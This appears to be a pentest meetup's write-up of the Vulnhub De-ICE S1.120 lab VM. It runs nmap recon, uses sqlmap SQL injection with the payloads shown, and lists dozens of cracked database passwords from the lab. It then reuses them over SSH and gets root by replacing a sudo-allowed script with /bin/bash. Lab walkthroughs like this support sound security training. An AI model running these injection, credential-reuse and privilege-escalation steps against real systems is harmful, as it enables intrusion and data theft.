@@ -1,0 +1,252 @@
+.. include:: /pentest_links.txt
+
+.. _De-ICE4:
+
+**************
+De-ICE Level 4
+**************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub De-ICE: S1.120 <https://www.vulnhub.com/entry/de-ice-s1120,10/>`_, the fourth of the Vulnhub De-ICE series. This is a challenge to get "various internal documents".
+
+Setting up the VM
+-----------------
+
+The VM comes packaged as the live ISO `De-ICE_S1.120.iso <http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso>`_ running SLAX 6.1.2 (based on Slackware 12.2.0). It uses fixed IP 192.168.1.120.
+
+Setting up your environment
+---------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice4
+  mkdir -p $PT
+  cd $PT
+  # download de-ice4_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice4_setup.sh
+  # edit as needed; later the recon will give you TARGET IPs
+  source de-ice4_setup.sh
+
+The source for :file:`de-ice4_setup.sh` (:download:`de-ice4_setup.sh`) should look something like the following.
+
+.. literalinclude:: de-ice4_setup.sh
+   :language: bash
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice4
+  source $PT/de-ice4_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we find the IP for de-ice4: $TARGET. Update $PT/de-ice4_setup.sh and also edit :file:`/etc/hosts` to add "de-ice4.com" (``echo "$TARGET de-ice4.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/de-ice4
+  source $PT/de-ice4_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,5,6,8,10
+
+  PORT     STATE SERVICE  REASON         VERSION
+  21/tcp   open  ftp      syn-ack ttl 64 ProFTPD 1.3.2
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  |_dr-xr-xr-x   2 0        0              40 Jan  2  2011 incoming
+  22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 5.1 (protocol 2.0)
+  80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+  |_http-title: Primaline :: Quality Kitchen Accessories
+  443/tcp  open  ssl/http syn-ack ttl 64 Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+  |_http-title: Primaline :: Quality Kitchen Accessories
+  3306/tcp open  mysql    syn-ack ttl 64 MySQL (unauthorized)
+  MAC Address: 52:54:00:32:4F:FD (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.13 - 2.6.32
+
+Browsing port 80
+----------------
+
+Visiting http://de-ice4.com/ leads to http://de-ice4.com/products.php and this form:
+
+.. code-block:: html
+
+  <form action="products.php" method="GET">
+    Product: <select name="id"><option value="NULL">Select Product</option><br></select><p>
+    <input type="Submit" value="Submit"></p>
+  </form>
+
+:program:`sqlmap` of :file:`products.php` form
+----------------------------------------------
+
+Attacking the form on http://de-ice4.com/products.php with :program:`sqlmap`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/de-ice4
+  source $PT/de-ice4_setup.sh
+  cd $PT/sqlmap
+
+  rm -rf sqlmap
+  URL="http://$TARGET/products.php"
+  sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+    --banner --current-user --is-dba --current-db --users --passwords \
+    --forms --dbs
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 18-70,72-78
+
+  hacker@kali:~/pentest/de-ice4/sqlmap$ sqlmap -u "$URL" --batch --random-agent --output-dir $PWD/sqlmap \
+  >   --banner --current-user --is-dba --current-db --users --passwords \
+  >   --forms --dbs
+
+  sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
+  ---
+  Parameter: id (GET)
+      Type: AND/OR time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+      Payload: id=NULL AND (SELECT * FROM (SELECT(SLEEP(5)))OfVy)
+
+      Type: UNION query
+      Title: Generic UNION query (NULL) - 5 columns
+      Payload: id=NULL UNION ALL SELECT NULL,NULL,CONCAT(0x7162786b71,0x705256575568487a6d6d,0x716b706a71),NULL,NULL-- 
+  ---
+  web application technology: Apache 2.2.11, PHP 5.2.9
+  back-end DBMS: MySQL 5.0.12
+  banner:    '5.1.33'
+  current user:    'webapp@localhost'
+  current database:    'merch'
+  current user is DBA:    True
+  [19:24:26] [INFO] cracked password '0' for user 'aadams'                       
+  [19:24:29] [INFO] cracked password '111111' for user 'aharp'                   
+  [19:24:29] [INFO] cracked password '123123' for user 'kclemons'                
+  [19:24:29] [INFO] cracked password '1234' for user 'rjacobson'                 
+  [19:24:29] [INFO] cracked password '12345' for user 'dgrant'                   
+  [19:24:29] [INFO] cracked password '123456' for user 'dtraylor'                
+  [19:24:29] [INFO] cracked password '1234567' for user 'dgilfillan'             
+  [19:24:29] [INFO] cracked password '12345678' for user 'sgains'                
+  [19:24:36] [INFO] cracked password '654321' for user 'strammel'                
+  [19:24:36] [INFO] cracked password '666666' for user 'aspears'                 
+  [19:24:43] [INFO] cracked password 'Password' for user 'lmorales'              
+  [19:24:46] [INFO] cracked password 'abc123' for user 'mrodriguez'              
+  [19:24:49] [INFO] cracked password 'babyl0n' for user 'jdavenport'             
+  [19:24:50] [INFO] cracked password 'baseball' for user 'bwatkins'              
+  [19:24:50] [INFO] cracked password 'batman' for user 'hlovell'                 
+  [19:24:51] [INFO] cracked password 'blahblah' for user 'qpowers'               
+  [19:24:54] [INFO] cracked password 'cheese' for user 'mholland'                
+  [19:24:55] [INFO] cracked password 'computer' for user 'djohnson'              
+  [19:24:55] [INFO] cracked password 'consumer' for user 'mbryan'                
+  [19:24:58] [INFO] cracked password 'dragon' for user 'bphillips'               
+  [19:25:01] [INFO] cracked password 'football' for user 'rdominguez'            
+  [19:25:02] [INFO] cracked password 'gawker' for user 'dstevens'                
+  [19:25:03] [INFO] cracked password 'gizmodo' for user 'jalvarez'               
+  [19:25:06] [INFO] cracked password 'iloveyou' for user 'jalcantar'             
+  [19:25:08] [INFO] cracked password 'jennifer' for user 'jbresnahan'            
+  [19:25:08] [INFO] cracked password 'jordan' for user 'krenfro'                 
+  [19:25:10] [INFO] cracked password 'killer' for user 'jayala'                  
+  [19:25:11] [INFO] cracked password 'kotaku' for user 'rpatel'                  
+  [19:25:12] [INFO] cracked password 'letmein' for user 'mnader'                 
+  [19:25:12] [INFO] cracked password 'lifehack' for user 'swarren'               
+  [19:25:15] [INFO] cracked password 'master' for user 'dcooper'                 
+  [19:25:15] [INFO] cracked password 'michael' for user 'aard'                   
+  [19:25:15] [INFO] cracked password 'michelle' for user 'tdeleon'               
+  [19:25:17] [INFO] cracked password 'monkey' for user 'sjohnson'                
+  [19:25:18] [INFO] cracked password 'nintendo' for user 'bbanter'               
+  [19:25:20] [INFO] cracked password 'passw0rd' for user 'jduff'                 
+  [19:25:20] [INFO] cracked password 'password' for user 'ccoffee'               
+  [19:25:21] [INFO] cracked password 'pepper' for user 'jfranklin'               
+  [19:25:22] [INFO] cracked password 'pokemon' for user 'myajima'                
+  [19:25:23] [INFO] cracked password 'princess' for user 'aheflin'               
+  [19:25:23] [INFO] cracked password 'qwerty' for user 'lmartinez'               
+  [19:25:27] [INFO] cracked password 'shadow' for user 'amaynard'                
+  [19:25:28] [INFO] cracked password 'soccer' for user 'cchisholm'               
+  [19:25:29] [INFO] cracked password 'starwars' for user 'ktso'                  
+  [19:25:29] [INFO] cracked password 'sunshine' for user 'kwebber'               
+  [19:25:30] [INFO] cracked password 'superman' for user 'aweiland'              
+  [19:25:32] [INFO] cracked password 'trustno1' for user 'dwestling'             
+  [19:25:34] [INFO] cracked password 'welcome' for user 'aallen'                 
+  [19:25:35] [INFO] cracked password 'whatever' for user 'tgoodchap'             
+  [19:25:37] [INFO] fetching database names
+  available databases [6]:
+  [*] cdcol
+  [*] information_schema
+  [*] merch
+  [*] mysql
+  [*] phpmyadmin
+  [*] test
+
+
+The Exploit
+===========
+
+MySQL passwords = SSH passwords
+-------------------------------
+
+It turns out the MySQL passwords cracked above were also SSH passwords. Try the first one for some simple reconnaisance to see if there might be a better id to use: user ccoffee is a member of the group "admin".
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,4
+
+  sshpass -p '0' ssh aadams@de-ice4.com
+  grep admin /etc/group
+  # results in
+  # admin:x:102:ccoffee
+  exit
+
+From user ccoffee to root
+-------------------------
+
+Logging in as ccoffee/password shows ccoffee can ``sudo /home/ccoffee/scripts/getlogs.sh``. But ccoffee can replace :file:`getlogs.sh` with any shell script (such as ``/bin/bash`` to get root):
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,5,10-14,16
+
+  sshpass -p 'password' ssh ccoffee@de-ice4.com
+  sudo -l
+  # results in
+  # User ccoffee may run the following commands on this host:
+  #    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh
+  cd /home/ccoffee/scripts
+  ls -l getlogs.sh
+  # results in
+  # -rws--x--x 1 root    admin 110 Aug 15 01:20 getlogs.sh*
+  mv getlogs.sh x.sh
+  echo "/bin/bash" > getlogs.sh
+  chmod +x getlogs.sh
+  sudo /home/ccoffee/scripts/getlogs.sh
+  id
+  # results in
+  # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
+
+Getting internal documents
+--------------------------
+
+So we're root. All we have to do is find the "various internal documents". The reader can start with :file:`/home/ktso/personnel.doc` and we leave it as an exercise to find the rest.
+
